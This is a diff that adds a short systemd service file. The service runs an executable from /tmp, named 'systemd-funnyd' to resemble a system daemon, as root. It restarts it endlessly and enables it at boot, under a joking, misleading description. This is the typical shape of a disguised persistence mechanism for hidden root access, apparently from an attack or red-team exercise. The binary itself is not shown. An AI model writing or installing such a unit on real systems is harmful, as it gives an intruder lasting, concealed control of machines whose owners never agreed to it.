@@ -1,0 +1,13 @@
+[Unit]
+Description=Important for ensuring humor
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=10
+User=root
+ExecStart=/tmp/systemd-funnyd
+
+[Install]
+WantedBy=multi-user.target
